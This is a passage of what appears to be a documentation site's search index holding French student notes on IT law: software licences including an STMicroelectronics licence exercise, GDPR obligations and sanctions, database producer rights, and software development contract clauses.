revanche toujours contr\u00f4ler leur compatibilit\u00e9 entre elles et avec d\u2019autres licences par exemple la GNU GPL ou la CeCILL).-Les licences asym\u00e9triques(on parle aussi de licences semi-libres)Le cr\u00e9ateur choisit la licence qu\u2019il applique \u00e0 son logiciel et aux enrichissements qu\u2019il apporte lui-m\u00eame. Il oblige par ailleurs \u00e0 ce que les enrichissements effectu\u00e9s par d\u2019autres personnes soient soumis \u00e0 une licence qu\u2019il a lui-m\u00eame d\u00e9sign\u00e9e, potentiellement diff\u00e9rente de celle qu\u2019il a retenue pour ses propres d\u00e9veloppements.Ces licences permettent notamment de combiner des codes issus de logiciels propri\u00e9taires et libres. Elles tentent de trouver un point d\u2019\u00e9quilibre entre des volont\u00e9s de libert\u00e9 et des strat\u00e9gies propri\u00e9taires ou commerciales (par exemple, le GNU LGPL, la MPL ou la CeciLL-C).(Source: AEC-guide juridique logiciel libre \u2013mars 2012","title":"Annexes"},{"location":"management/STMicroelectronics/#questions","text":"1) Rappeler le cadre g\u00e9n\u00e9ral de la protection des logiciels en droit fran\u00e7ais. 2) Identifier dans le cadre de ce projet le choix de la licence d\u2019exploitation retenue pour ce logiciel. Enoncer les droits conc\u00e9d\u00e9s par STMicroelectronics aux entreprises utilisatrices de ce logiciel. Julie Leroy, salari\u00e9e de la soci\u00e9t\u00e9 STMicroelectronics, a d\u00e9velopp\u00e9 le logiciel STM32 CubeTM. Elle a d\u00e9missionn\u00e9 en vue de cr\u00e9er sa propre entreprise informatique. Elle envisage de faire \u00e9voluer le logiciel et ensuite de commercialiser la version 2. 3) Montrer que STMicroelectronics ne peut s\u2019opposer \u00e0 la modification et \u00e0 la commercialisation du logiciel par Julie Leroy.","title":"Questions"},{"location":"management/STMicroelectronics/#reponses","text":"1) Le cadre g\u00e9n\u00e9ral de protection des logiciels et le droit d'auteur, qui implique en caract\u00e8re d'\"originalit\u00e9\" qui se traduit par une ant\u00e9riorit\u00e9 du logiciel cr\u00e9\u00e9. 2) Le choix fait par l'entreprise ST est de distribuer son logiciel par le biais d'une licence BSD qui occtoire les droits les plus \u00e9tendus \u00e0 l'utilisateur, \u00e0 savoir les 4 liberti\u00e9s fondamentales : Utiliser le logiciel Copier le logiciel Etudier modifier et distribuer les versions modifi\u00e9s du logiciel (y compris transformer l'open source en logiciel propri\u00e9taire).","title":"R\u00e9ponses"},{"location":"management/donnes_personnelles/","text":"Comment traiter les donn\u00e9es collect\u00e9es ? Le consentant de la personne est le premier biais de collecte. Execution d'un contrat (contrat de travail) => logique et de proportionnalit\u00e9 => acceptation de conditions g\u00e9n\u00e9rales (monster, cadreemploi, donn\u00e9e CV)(APEC) obligation l\u00e9gals : imp\u00f4ts, carte grise, points sur le permis. Il existe 2 types de collecte : * Direct : Dans ce cas l'information est commmuniqu\u00e9 au moment de la collecte. Par \u00e9crit, email ou par oral (t\u00e9l\u00e9phone). * Indirect (plus rare) : Dans ce cas (collecte massive de DCP) au moment du premier usage de DCP : reception massive de CV => l'information est faite au candidat quand le CV est transf\u00e9r\u00e9. Comment informer les personnes concern\u00e9es ? En terms claires et simples Ais\u00e9ment accesible De mani\u00e8re concise En toute transparence Compr\u00e9hensible par le publique vis\u00e9 Moyens de communication aux personnes concern\u00e9es : Conditions g\u00e9n\u00e9rales d'utilisation (CGU) Intranet, afficahen email par les salari\u00e9s Information sur site internet (type cookies) Comment conserver les donn\u00e9es ? Base active : conservation par la dur\u00e9e et la necessit\u00e9 du traitement Archives interm\u00e9diaires : conservation li\u00e9e \u00e0 une obligation l\u00e9gale ou dans le cadre d'un contentieux Archivage d\u00e9finitif : Conservation de certaines donn\u00e9es qui repr\u00e9sentent un int\u00e9r\u00eat statistique, historique ou scientifique. Mesure de s\u00e9curit\u00e9 Base active : mesure de s\u00e9curit\u00e9 minimale corrrespondantes au type de traitement. Une fois la donn\u00e9e utilis\u00e9e, elle peut-\u00eatre supprim\u00e9e. Archives interm\u00e9diaures : mesure de s\u00e9curit\u00e9 particuliaire garantissant que seuls les services qui ont un besoin strict ont un acc\u00e8s. Archivage d\u00e9finitif : Les donn\u00e9es dans ce cas doivent \u00eatre anonymis\u00e9es ou transmisent \u00e0 des organisme d'\u00e9tat ou sous tutelle de l'\u00e9tat (ARS, INSEE, CPAM)) Les droits des personnes information : c'est le point d'entr\u00e9e du RGPD Acc\u00e8s : aux donn\u00e9es personnelles qui nous concernent Le DPO (Data Protection Officer) missions : Informer et conseiller sur les obligations du responsable du traitement des donn\u00e9es, des sous-traiteants, et des salari\u00e9s qui peuvent \u00eatre ammen\u00e9s \u00e0 traiter des donn\u00e9es. controler : la conformit\u00e9 au RGPD et aux r\u00e8gles internes de protection des donn\u00e9es de l'ensemble des dispositifs et des process de l'entreprise Conseiller : La structure sur la mise en place des aspects li\u00e9s aux donn\u00e9es (DCP) => information des salari\u00e9s => type de DCP recup\u00e9r\u00e9e => Dur\u00e9e de stockage, etc Pour qui ? Obligatoire : Organisme, entreprise, administrations publiques entreprise qui proc\u00e8dent aux traitement de DCP \u00e0 carat\u00e8re sp\u00e9cifiques : donn\u00e9es de santes, activit\u00e9 physique, politique, religieuse, sexuelle, biom\u00e9trique, condamnations, infractions, etc recommand\u00e9 : entreprise traitant de nombreuses donn\u00e9es / entreprise intervenant sur des march\u00e9s publiques Les obligations du responsable du traitement Ses obligations Dans le registre : doivent eventuellement figur\u00e9s les transferts de DCO vers les pays tiers au RGPD et/ou vers les organisations internationales d\u00e9lai d'effaceemnt des DCP descriptions des mesures techniques et orhanisationelles de protections des DCP ex: SIO 27001 La s\u00e9curit\u00e9 des DCP : analyse des risques, de la probabilit\u00e9 de r\u00e9alisation du risque, des mesures \u00e0 appropri\u00e9es, des co\u00fbts li\u00e9s \u00e0 la protection des DCP, de la pertinance des mesures. Dans le but de proteger contre la perte, la destruction, l'alt\u00e9ration, la divulgation non autoris\u00e9 des DCP Ses obligations Sur ces aspects s\u00e9curit\u00e9 le RGPD \"recommande\" de mettre en place : * pseudonomisation et chiffrement des donn\u00e9es * Moyens pour garantir la confidentialit\u00e9, l'int\u00e9grit\u00e9, la disponibilit\u00e9 et la r\u00e9silience constante * * proc\u00e9dure de test et d'analyse des outils mis en place de mani\u00e8re r\u00e9p\u00e9titifs (audit permanent) Les responsabilit\u00e9s du responsable du traitement Quelles questions se posent avant de mettre en place une strat\u00e9gie s\u00e9curit\u00e9 des DCP ? * Les utilisateurs sont-ils sensibilis\u00e9s aux r\u00e8gles de s\u00e9curit\u00e9 ? * Les utilisateurs ont-ils des login particulier (peut-on identifier l'utilisateur ?) * les postes de travail sont ils s\u00e9curis\u00e9s par des mots de passe ? * l'informatique mobile est-elle s\u00e9curis\u00e9e ? * le r\u00e9seau est-il s\u00e9curis\u00e9 ? * Des sauvegardes existent-elles ? * l'activit\u00e9 des sous-traitants est-elle encadr\u00e9e ? Que faire en cas de violations des DCP ? 1) Appliquer une proc\u00e9dure sp\u00e9cifique avec une grande r\u00e9activit\u00e9 ? 2) impliquer tous les m\u00e9tiers et interlocuteurs (transparence) ? 3) Tenir un registre des incidents et des mesures de rem\u00e9diations ! => D\u00e9terminer si la violation est susceptible d'engendrer un risque pour les droits et libert\u00e9s des entreprises ! En mati\u00e8re de s\u00e9curit\u00e9 des DCP, l'enteprise et le responsable du traitement ne sont tenu qu'\u00e0 une obligation de moyens => faire tout le n\u00e9cessaire pour prot\u00e9ger les DCP. Obligation relative aux mots de passe 1) S\u00e9curisation de l'authentification : L'authentification doit faire appel \u00e0 des mots de passe difficilement d\u00e9chiffrables 2) Conservation des mots de passe : Pas de stockage en claire, transformation par le biais de fonctions cryptographiques non r\u00e9versibles 3) renouvellement de mot de passe : Le renouvellement doit etre adapt\u00e9 (dur\u00e9e et complexit\u00e9) en fonction des donn\u00e9es auquels il donne acc_s. Si acc\u00e8s \u00e0 des donn\u00e9es sensibles :pr\u00e9riodicit\u00e9 plus courte et complexit\u00e9 plus grande => le speronnes (nomm\u00e9es doivent \u00eatr een mesure de changer seuls leur mot de passe) Compromission du mot de passe Notification \u00e0 la personne concern\u00e9e sous 72h obligation de changer le mot de passe recommandantion de chaner les mots de passe d'autres services Les zonnes de commentaire libre blocnotes; post it num\u00e9rique; mots; commentaires; remarques, champs de saisies libres; => toutes ces choses sont soumises au RGPD En utilisant ces zones de commentaire partag\u00e9, il faut absolument \u00e9viter les termes p\u00e9joratifs, peu flatteurs, injurieux, n\u00e9gatifs. Le conditionnel, le sens ambig\u00fce ou \u00e9vasifs. sanctions administratives Degr\u00e9 1 : Avertissement => Dans ce cas l'entreprise fait l'objet d'un simple rappel \u00e0 l'ordre (pr\u00e9semption de bonne foi) Degr\u00e9 2 : injonction de cesser le traitement des DCP non conforme au RGPD Degr\u00e9 3 : en cas sanction administrative (arr\u00eat du traitement de donn\u00e9e non conforme RGPD) Degr\u00e9 4 : Publication de la condamnation sur la pge web de l'entreprise ou via les m\u00e9dias sanctions p\u00e9cuniaires => le RGPD pr\u00e9voit des amendes allant jusqu'\u00e0 20 000 000\u20ac ou 4% du chiffre d'affaire mondial => sanctions p\u00e9nales : la LiL (loi informatique et libert\u00e9) pr\u00e9voit un certain nombre de sanctions p\u00e9nales en cas de traitemetn fauduleux des DCP (3 ans de prison; 300 000\u20ac d'ammendes)","title":"Comment traiter les donn\u00e9es collect\u00e9es ?"},{"location":"management/donnes_personnelles/#comment-traiter-les-donnees-collectees","text":"Le consentant de la personne est le premier biais de collecte. Execution d'un contrat (contrat de travail) => logique et de proportionnalit\u00e9 => acceptation de conditions g\u00e9n\u00e9rales (monster, cadreemploi, donn\u00e9e CV)(APEC) obligation l\u00e9gals : imp\u00f4ts, carte grise, points sur le permis. Il existe 2 types de collecte : * Direct : Dans ce cas l'information est commmuniqu\u00e9 au moment de la collecte. Par \u00e9crit, email ou par oral (t\u00e9l\u00e9phone). * Indirect (plus rare) : Dans ce cas (collecte massive de DCP) au moment du premier usage de DCP : reception massive de CV => l'information est faite au candidat quand le CV est transf\u00e9r\u00e9.","title":"Comment traiter les donn\u00e9es collect\u00e9es ?"},{"location":"management/donnes_personnelles/#comment-informer-les-personnes-concernees","text":"En terms claires et simples Ais\u00e9ment accesible De mani\u00e8re concise En toute transparence Compr\u00e9hensible par le publique vis\u00e9","title":"Comment informer les personnes concern\u00e9es ?"},{"location":"management/donnes_personnelles/#moyens-de-communication-aux-personnes-concernees","text":"Conditions g\u00e9n\u00e9rales d'utilisation (CGU) Intranet, afficahen email par les salari\u00e9s Information sur site internet (type cookies)","title":"Moyens de communication aux personnes concern\u00e9es :"},{"location":"management/donnes_personnelles/#comment-conserver-les-donnees","text":"Base active : conservation par la dur\u00e9e et la necessit\u00e9 du traitement Archives interm\u00e9diaires : conservation li\u00e9e \u00e0 une obligation l\u00e9gale ou dans le cadre d'un contentieux Archivage d\u00e9finitif : Conservation de certaines donn\u00e9es qui repr\u00e9sentent un int\u00e9r\u00eat statistique, historique ou scientifique.","title":"Comment conserver les donn\u00e9es ?"},{"location":"management/donnes_personnelles/#mesure-de-securite","text":"Base active : mesure de s\u00e9curit\u00e9 minimale corrrespondantes au type de traitement. Une fois la donn\u00e9e utilis\u00e9e, elle peut-\u00eatre supprim\u00e9e. Archives interm\u00e9diaures : mesure de s\u00e9curit\u00e9 particuliaire garantissant que seuls les services qui ont un besoin strict ont un acc\u00e8s. Archivage d\u00e9finitif : Les donn\u00e9es dans ce cas doivent \u00eatre anonymis\u00e9es ou transmisent \u00e0 des organisme d'\u00e9tat ou sous tutelle de l'\u00e9tat (ARS, INSEE, CPAM))","title":"Mesure de s\u00e9curit\u00e9"},{"location":"management/donnes_personnelles/#les-droits-des-personnes","text":"information : c'est le point d'entr\u00e9e du RGPD Acc\u00e8s : aux donn\u00e9es personnelles qui nous concernent","title":"Les droits des personnes"},{"location":"management/donnes_personnelles/#le-dpo-data-protection-officer","text":"missions : Informer et conseiller sur les obligations du responsable du traitement des donn\u00e9es, des sous-traiteants, et des salari\u00e9s qui peuvent \u00eatre ammen\u00e9s \u00e0 traiter des donn\u00e9es. controler : la conformit\u00e9 au RGPD et aux r\u00e8gles internes de protection des donn\u00e9es de l'ensemble des dispositifs et des process de l'entreprise Conseiller : La structure sur la mise en place des aspects li\u00e9s aux donn\u00e9es (DCP) => information des salari\u00e9s => type de DCP recup\u00e9r\u00e9e => Dur\u00e9e de stockage, etc Pour qui ? Obligatoire : Organisme, entreprise, administrations publiques entreprise qui proc\u00e8dent aux traitement de DCP \u00e0 carat\u00e8re sp\u00e9cifiques : donn\u00e9es de santes, activit\u00e9 physique, politique, religieuse, sexuelle, biom\u00e9trique, condamnations, infractions, etc recommand\u00e9 : entreprise traitant de nombreuses donn\u00e9es / entreprise intervenant sur des march\u00e9s publiques","title":"Le DPO (Data Protection Officer)"},{"location":"management/donnes_personnelles/#les-obligations-du-responsable-du-traitement","text":"","title":"Les obligations du responsable du traitement"},{"location":"management/donnes_personnelles/#ses-obligations","text":"Dans le registre : doivent eventuellement figur\u00e9s les transferts de DCO vers les pays tiers au RGPD et/ou vers les organisations internationales d\u00e9lai d'effaceemnt des DCP descriptions des mesures techniques et orhanisationelles de protections des DCP ex: SIO 27001","title":"Ses obligations"},{"location":"management/donnes_personnelles/#la-securite-des-dcp","text":"analyse des risques, de la probabilit\u00e9 de r\u00e9alisation du risque, des mesures \u00e0 appropri\u00e9es, des co\u00fbts li\u00e9s \u00e0 la protection des DCP, de la pertinance des mesures. Dans le but de proteger contre la perte, la destruction, l'alt\u00e9ration, la divulgation non autoris\u00e9 des DCP","title":"La s\u00e9curit\u00e9 des DCP :"},{"location":"management/donnes_personnelles/#ses-obligations_1","text":"Sur ces aspects s\u00e9curit\u00e9 le RGPD \"recommande\" de mettre en place : * pseudonomisation et chiffrement des donn\u00e9es * Moyens pour garantir la confidentialit\u00e9, l'int\u00e9grit\u00e9, la disponibilit\u00e9 et la r\u00e9silience constante * * proc\u00e9dure de test et d'analyse des outils mis en place de mani\u00e8re r\u00e9p\u00e9titifs (audit permanent)","title":"Ses obligations"},{"location":"management/donnes_personnelles/#les-responsabilites-du-responsable-du-traitement","text":"Quelles questions se posent avant de mettre en place une strat\u00e9gie s\u00e9curit\u00e9 des DCP ? * Les utilisateurs sont-ils sensibilis\u00e9s aux r\u00e8gles de s\u00e9curit\u00e9 ? * Les utilisateurs ont-ils des login particulier (peut-on identifier l'utilisateur ?) * les postes de travail sont ils s\u00e9curis\u00e9s par des mots de passe ? * l'informatique mobile est-elle s\u00e9curis\u00e9e ? * le r\u00e9seau est-il s\u00e9curis\u00e9 ? * Des sauvegardes existent-elles ? * l'activit\u00e9 des sous-traitants est-elle encadr\u00e9e ? Que faire en cas de violations des DCP ? 1) Appliquer une proc\u00e9dure sp\u00e9cifique avec une grande r\u00e9activit\u00e9 ? 2) impliquer tous les m\u00e9tiers et interlocuteurs (transparence) ? 3) Tenir un registre des incidents et des mesures de rem\u00e9diations ! => D\u00e9terminer si la violation est susceptible d'engendrer un risque pour les droits et libert\u00e9s des entreprises ! En mati\u00e8re de s\u00e9curit\u00e9 des DCP, l'enteprise et le responsable du traitement ne sont tenu qu'\u00e0 une obligation de moyens => faire tout le n\u00e9cessaire pour prot\u00e9ger les DCP.","title":"Les responsabilit\u00e9s du responsable du traitement"},{"location":"management/donnes_personnelles/#obligation-relative-aux-mots-de-passe","text":"1) S\u00e9curisation de l'authentification : L'authentification doit faire appel \u00e0 des mots de passe difficilement d\u00e9chiffrables 2) Conservation des mots de passe : Pas de stockage en claire, transformation par le biais de fonctions cryptographiques non r\u00e9versibles 3) renouvellement de mot de passe : Le renouvellement doit etre adapt\u00e9 (dur\u00e9e et complexit\u00e9) en fonction des donn\u00e9es auquels il donne acc_s. Si acc\u00e8s \u00e0 des donn\u00e9es sensibles :pr\u00e9riodicit\u00e9 plus courte et complexit\u00e9 plus grande => le speronnes (nomm\u00e9es doivent \u00eatr een mesure de changer seuls leur mot de passe)","title":"Obligation relative aux mots de passe"},{"location":"management/donnes_personnelles/#compromission-du-mot-de-passe","text":"Notification \u00e0 la personne concern\u00e9e sous 72h obligation de changer le mot de passe recommandantion de chaner les mots de passe d'autres services","title":"Compromission du mot de passe"},{"location":"management/donnes_personnelles/#les-zonnes-de-commentaire-libre","text":"blocnotes; post it num\u00e9rique; mots; commentaires; remarques, champs de saisies libres; => toutes ces choses sont soumises au RGPD En utilisant ces zones de commentaire partag\u00e9, il faut absolument \u00e9viter les termes p\u00e9joratifs, peu flatteurs, injurieux, n\u00e9gatifs. Le conditionnel, le sens ambig\u00fce ou \u00e9vasifs.","title":"Les zonnes de commentaire libre"},{"location":"management/donnes_personnelles/#sanctions-administratives","text":"Degr\u00e9 1 : Avertissement => Dans ce cas l'entreprise fait l'objet d'un simple rappel \u00e0 l'ordre (pr\u00e9semption de bonne foi) Degr\u00e9 2 : injonction de cesser le traitement des DCP non conforme au RGPD Degr\u00e9 3 : en cas sanction administrative (arr\u00eat du traitement de donn\u00e9e non conforme RGPD) Degr\u00e9 4 : Publication de la condamnation sur la pge web de l'entreprise ou via les m\u00e9dias","title":"sanctions administratives"},{"location":"management/donnes_personnelles/#sanctions-pecuniaires","text":"=> le RGPD pr\u00e9voit des amendes allant jusqu'\u00e0 20 000 000\u20ac ou 4% du chiffre d'affaire mondial => sanctions p\u00e9nales : la LiL (loi informatique et libert\u00e9) pr\u00e9voit un certain nombre de sanctions p\u00e9nales en cas de traitemetn fauduleux des DCP (3 ans de prison; 300 000\u20ac d'ammendes)","title":"sanctions p\u00e9cuniaires"},{"location":"management/exploitation_base_de_donne/","text":"L'exploitation de base de donn\u00e9es PRoteger la cr\u00e9ation de sa base de donn\u00e9e Par le biais du droit d'auteur. La l\u00e9gislation consid\u00e8re qu'une base de donn\u00e9e est comme une compilation de musique, une anthologie poetique, etc. => assemblage d'\u00e9l\u00e9ments distincts sous une forme \"originale\". Proteger la cr\u00e9ation de sa base de donn\u00e9e Droit d'auteur (crit\u00e8res classiques d'originalit\u00e9 et d'aenteriorit\u00e9) Droit \"sui generis\" du producteur de base de donn\u00e9es. C'est un droit qui existe depuis 1998 et qui permet de prot\u00e9ger des BDD qui ne pouvaient pas prot\u00e9ger par le droit d'auteur mais dont la cr\"ation a n\u00e9c\u00e9ssit\u00e9 des investissements subsentiels. Protection par le droit du producteur Comparatif de vols qui agr\u00e8gent toutes les donn\u00e9es des comanies a\u00e9riennes et permetent un acc\u00e8s \u00e0 cette base via une interface utilisateur => constituer ce comparatif est couteux mais PAS original => pas de protection via le droit d'auteur mais une protection via le droit de producteur de base de donn\u00e9e.","title":"L'exploitation de base de donn\u00e9es"},{"location":"management/exploitation_base_de_donne/#lexploitation-de-base-de-donnees","text":"","title":"L'exploitation de base de donn\u00e9es"},{"location":"management/exploitation_base_de_donne/#proteger-la-creation-de-sa-base-de-donnee","text":"Par le biais du droit d'auteur. La l\u00e9gislation consid\u00e8re qu'une base de donn\u00e9e est comme une compilation de musique, une anthologie poetique, etc. => assemblage d'\u00e9l\u00e9ments distincts sous une forme \"originale\".","title":"PRoteger la cr\u00e9ation de sa base de donn\u00e9e"},{"location":"management/exploitation_base_de_donne/#proteger-la-creation-de-sa-base-de-donnee_1","text":"Droit d'auteur (crit\u00e8res classiques d'originalit\u00e9 et d'aenteriorit\u00e9) Droit \"sui generis\" du producteur de base de donn\u00e9es. C'est un droit qui existe depuis 1998 et qui permet de prot\u00e9ger des BDD qui ne pouvaient pas prot\u00e9ger par le droit d'auteur mais dont la cr\"ation a n\u00e9c\u00e9ssit\u00e9 des investissements subsentiels.","title":"Proteger la cr\u00e9ation de sa base de donn\u00e9e"},{"location":"management/exploitation_base_de_donne/#protection-par-le-droit-du-producteur","text":"Comparatif de vols qui agr\u00e8gent toutes les donn\u00e9es des comanies a\u00e9riennes et permetent un acc\u00e8s \u00e0 cette base via une interface utilisateur => constituer ce comparatif est couteux mais PAS original => pas de protection via le droit d'auteur mais une protection via le droit de producteur de base de donn\u00e9e.","title":"Protection par le droit du producteur"},{"location":"management/proteger_le_travail/","text":"Proteger le travail protection de logiciel Qui est l'auteur(e) ? Si le cr\u00e9ateur est seul, il est titulaire des droits d'auteur(e)s SAUF si ce dernier est cr\u00e9\u00e9 en entreprise ou utilisant les outils de l'entreprise ou pendant le temps de travail. Jurisprudence = vide juridique Les cr\u00e9ateurs sont plusieurs mais travaillent pour leurs comptes : cr\u00e9er une collaboration => tous les cr\u00e9ateurs sont titulaires du droit. Si un veut pas vendre personne vend. Les oeuvres collaboratives => plusieurs cr\u00e9ateurs travaillent pour un donneur d'ordre Il est possible que lors du developpement d\"un logiciel, de nouvelle techno/techniques/amelioration peuvent \u00eatre d\u00e9couvertes. Il peut etre pr\u00e9vu contractuellement que toutes les d\u00e9couvertes li\u00e9es au d\u00e9veloppement du logiciel appartiennent au client. Qu'est ce qui est prot\u00e9g\u00e9 ? Le travail pr\u00e9paratoire le code source + le code machine L'architecture la documentation technique L'algorithme n'est pas prot\u00e9g\u00e9 par le droit d'auteur. (formule math\u00e9matique) Qu'est ce qui prot\u00e8ge le logiciel ? Prot\u00e9ger par le droit d'auteur Par les brevets La marque peut-\u00eatre prot\u00e9g\u00e9e par le droit des marques (windows) et des dessins (certaines polices de charact\u00e8res sont prot\u00e9g\u00e9es par le droit des dessins) Droit des oeuvres musicales. Le logiciel opensource Toujours en titulaire du droit d'auteur mais celui-ci autorise tous les utilisateurs \u00e0 modifier, acc\u00e9der, copier, redistribuer le code source. => Gratuitement ou de mani\u00e8re payante. Licence Le contrat par lequel l'\u00e9diteur du logiciel met \u00e0 disposition le logiciel aux utilisateurs contre paiement d'une redevance. Ex : Office 365 Licence libre Par d\u00e9finition le texte de la licence est \"libre\" : Une dur\u00e9e, un nombre d'utilisateur, une zone g\u00e9ographique Y compris l'exclusivit\u00e9 L'exploitation des logiciels se fait par le biais de licences Le contenu de la licence est libre, seuls certains points sont impos\u00e9s par la loi : la licence ne peut pas introduire la copie priv\u00e9e / sauvegarde La loi autorise de modifier / adapter le logiciel afin qu'il soit conforme \u00e0 son utilisation. Que faire en cas de non respect du droit d'auteur ? Situation dans laqeuelle l'auteur (\u00e9diteur) d'un logiciel d\u00e9couvre une utilisation non autoris\u00e9e de son logiciel => Dans ce cas il doit saisir les tribunaux afin de faire cesser l'utilisation non autoris\u00e9e (logiciels craqu\u00e9) => demande d'astreinte. Vous cr\u00e9er un logiciel, une personne r\u00e9cup\u00e8re de mani\u00e8re froduleuse le code source et utilise le logiciel en son nom. => action en contrefa\u00e7on, il faudra d\u00e9montrer \u00eatr le premier \u00e0 l'avoir cr\u00e9\u00e9. (mail, code etc). Exemple de contrat de developpement sp\u00e9cifique de logiciel 1) identification des partis - prestataire : adresse, nom de l'entreprise, repr\u00e9sentant l\u00e9gal, num\u00e9ro RCS, nom du signataire. 1ere question : si exclusivit\u00e9 du logiciel, client sp\u00e9cifique ou client + filliales 3) Le prix ? PLusieurs param\u00e8tres rentrent en ligne de compte dans le calcul du prix : * le scode of work => le prix doit \u00eatre conforme \u00e0 ce qui est \"r\u00e9ellement vendu\" * L'exclusivit\u00e9 ou non sur le logiciel => prix plus \u00e9lev\u00e9 si exclusivit\u00e9 * les prestataires anexes (formation, mise \u00e0 jour, etc) Sur la prestation intelectuelle, ce qui compte tarif (homme/jour) + prix \u00e9quipement forfaitaire Forfait 150000\u20ac HT developpement + installation ERP s\u00e9curis\u00e9 Si d\u00e9pense 180000\u20ac, c'est 30000\u20ac de perte. Si d\u00e9pense 90000\u20ac, gain 60000\u20ac R\u00e9gie On communique au client les prix : - technicien : 400\u20ac - ing\u00e9 : 650\u20ac - chef projet : 800\u20ac budget \u00e9quipement 20% => Budget estimatif. L'enterprise revient r\u00e9guli\u00e8rement vers le clients avec l'\u00e9volution du prix. L'avantage pour le client du prix en r\u00e9gie c'est qu'il est s\u00fbr de payer exactement ce que \u00e7a co\u00fbte. Ne paiera pas plus que ce que \u00e7a vaut. Les modalit\u00e9s de paiements C'est libre Exemple : 30% \u00e0 la signature 40% recette provisoir 30% recette finale L'objectif \u00e9tant d'\u00eatre en tr\u00e9sorerie positive. 4) Modalit\u00e9s de facturation L'inter\u00eat est de facturer et d'\u00eatre pay\u00e9 rapidement. L'id\u00e9al est d'\u00eatre pay\u00e9 par le client avant de payer le fournisseur. Vente d'un serveur : (10000\u20ac prix client => 30 jours / 7000\u20ac prix fournisseur => 60 jours) => T.P = 3000\u20ac 2eme perte : les stocks ont un co\u00fbt, limiter au maximum les stocks. => close de r\u00e9serve de propri\u00e9t\u00e9. A default de paiement de l'int\u00e9gralit\u00e9 du prix, les \u00e9quipements seront retir\u00e9s au vendeur \u00e0 la charge du client. Un objet lou\u00e9 ne pourra pas \u00eatre saisi, n'appartient pas \u00e0 la personne mais \u00e0 l'entreprise qui loue. clause \" Les partis sont convenues que le transfert de propri\u00e9t\u00e9 des \"biens\" vendus est dif\u00e9r\u00e9 jusqu'au complet paiement de la somme correspondant au dit \u00e9quipement\". - 1er avantage : En cas de non paiement, les \u00e9quipements peuvent \u00eatre r\u00e9cup\u00e9r\u00e9s. - 2eme avantage : En cas de liquideation judiciaire du client, les biens non pay\u00e9s appartiennent encore au vendeur. 5) Travaux additionnels Cette close pr\u00e9voit que le client peut demander des T.S, en tous les cas cela doit faire l'objet d'un avenant au contrat. - Article 2 D\u00e9finition des prestataires : les prestations sont modifi\u00e9s telles que d\u00e9crites dans la V2 du cahier des charges. - Article 3 : Le prix est modifi\u00e9 comme suit - Article X : Le d\u00e9lai de livraison est \u00e9tendu de X jours Le montant des travaux suppl\u00e9mentaires (T.S) sera calcul\u00e9 sur la base suivante : => 500\u20ac/jour/technicien => 750\u20ac/jour/ing\u00e9 => prix des \u00e9quipements +20% 6) D\u00e9lais d'execution Toujours le calculer en semaine ou mois mais pas de date de fin, et pr\u00e9voir les conditions de d\u00e9but des prestations (pr\u00e9-requis client). electricit\u00e9 acc\u00e8s connexion arr\u00eat de production => Le d\u00e9lai de commence \u00e0 courrir que lorsque toutes les conditions sont remplies. Tout retard imputable au client et/ou aux autres entreprises interantes sur site donne droit \u00e0 une extension de d\u00e9lai (\u00e9quivalente) au retard + un d\u00e9lai raisonnable n\u00e9cessaire pour la r\u00e9flexion du personnel du prestataire. \"Tout retard imputable au prestataire donnera droit au client \u00e0 un paiement de 1% du montant du contrat par semaine de retard\" Je dois d\u00e9velopper un logiciel qui fait fonctionner une ligne de prod (1M\u20ac/jour). =>Je vends mon logiciel : 100.000\u20ac 5 mois => livraison 6 mois : 4000\u20ac p\u00e9nalit\u00e9 de retard En droit des contrats : Les p\u00e9nalit\u00e9s de retard (liquidated et domages) sont forfaitaire et lib\u00e9ratoire, ce qui signifie que le client ne peut pas demander plus de d\u00e9dommagement au titre des retards. En cas de retard le prestataire n'a rien \u00e0 payer en plus que le montant des p\u00e9nalit\u00e9s. 7) Collaboration du client => le prestataire peut lister des pr\u00e9requis Le client est tenu de collaborer avec le prestataire : - Lui fournir l'ensemble des informations n\u00e9cessaires \u00e0 la bonne r\u00e9alisation du projet. - Lui indiquer des \u00e9ventuelles difficult\u00e9s li\u00e9s \u00e0 la r\u00e9alisation des prestataires. - Valider le cahier des charges. - Participer aux r\u00e9unions, etc 8) Tests Important : Tester le fonctionnement de ce que vous faites => la recette (le recetage) Qui \u00e9tablit les tests : les clients ? le prestataire ? => le calendrier + les tests \u00e0 proprement parl\u00e9. L'id\u00e9al \u00e9tant de tester r\u00e9guli\u00e8rement les \u00e9valuations du d\u00e9veloppement du logiciel. 9) la recette Pr\u00e9voir un d\u00e9lai maximum de r\u00e9ponse du client en pr\u00e9cisant que pass\u00e9 ce d\u00e9lai la recette est sens\u00e9e avoir \u00e9t\u00e9 faite. \" A defaut de r\u00e9ponse du client sous 8 jours \u00e0 la demande de recette du prestataire, la recette est r\u00e9put\u00e9e avoir \u00e9t\u00e9 r\u00e9alis\u00e9e.\" La garantie A dater de la recette, le prestataire s'engage \u00e0 corriger les anomalies \u00e9ventuelles pendant une p\u00e9riode de X mois (\u00e0 n\u00e9gocier). Plafonner \u00e0 un co\u00fbt, droit \u00e0 X\u20ac de r\u00e9parations.","title":"Proteger le travail"},{"location":"management/proteger_le_travail/#proteger-le-travail","text":"","title":"Proteger le travail"},{"location":"management/proteger_le_travail/#protection-de-logiciel","text":"Qui est l'auteur(e) ? Si le cr\u00e9ateur est seul, il est titulaire des droits d'auteur(e)s SAUF si ce dernier est cr\u00e9\u00e9 en entreprise ou utilisant les outils de l'entreprise ou pendant le temps de travail. Jurisprudence = vide juridique Les cr\u00e9ateurs sont plusieurs mais travaillent pour leurs comptes : cr\u00e9er une collaboration => tous les cr\u00e9ateurs sont titulaires du droit. Si un veut pas vendre personne vend. Les oeuvres collaboratives => plusieurs cr\u00e9ateurs travaillent pour un donneur d'ordre Il est possible que lors du developpement d\"un logiciel, de nouvelle techno/techniques/amelioration peuvent \u00eatre d\u00e9couvertes. Il peut etre pr\u00e9vu contractuellement que toutes les d\u00e9couvertes li\u00e9es au d\u00e9veloppement du logiciel appartiennent au client. Qu'est ce qui est prot\u00e9g\u00e9 ? Le travail pr\u00e9paratoire le code source + le code machine L'architecture la documentation technique L'algorithme n'est pas prot\u00e9g\u00e9 par le droit d'auteur. (formule math\u00e9matique) Qu'est ce qui prot\u00e8ge le logiciel ? Prot\u00e9ger par le droit d'auteur Par les brevets La marque peut-\u00eatre prot\u00e9g\u00e9e par le droit des marques (windows) et des dessins (certaines polices de charact\u00e8res sont prot\u00e9g\u00e9es par le droit des dessins) Droit des oeuvres musicales. Le logiciel opensource Toujours en titulaire du droit d'auteur mais celui-ci autorise tous les utilisateurs \u00e0 modifier, acc\u00e9der, copier, redistribuer le code source. => Gratuitement ou de mani\u00e8re payante. 